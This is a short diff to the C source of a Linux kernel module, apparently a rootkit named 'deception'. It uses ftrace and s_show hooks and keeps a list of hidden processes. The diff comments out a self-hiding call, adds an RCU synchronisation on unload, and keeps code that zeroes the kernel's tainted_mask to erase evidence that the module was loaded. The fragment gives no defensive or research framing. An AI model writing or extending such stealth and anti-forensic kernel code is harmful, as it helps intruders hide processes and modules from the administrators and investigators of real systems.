@@ -31,6 +31,8 @@
 #include <linux/ftrace.h>
 #include <linux/linkage.h>
 #include <linux/string.h>
+#include <linux/delay.h>
+#include <linux/rcupdate.h>
 
 #include "ftrace_helper.h"
 
@@ -930,7 +932,7 @@ static int __init deception_init(void)
     tainted_mask_ptr = (unsigned long *)kallsyms_lookup_name_fn("tainted_mask");
     if (tainted_mask_ptr)
         *tainted_mask_ptr = 0;
-    hideme_full();
+//    hideme_full();
     return 0;
 }
 
@@ -938,8 +940,12 @@ static void __exit deception_exit(void)
 {
     remove_s_show_hook();
     fh_remove_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
+    
+    /* 4. Final RCU sync before freeing internal lists/structures */
+    synchronize_rcu();
     clear_all_hidden_pids();
 }
+
 
 module_init(deception_init);
 module_exit(deception_exit);
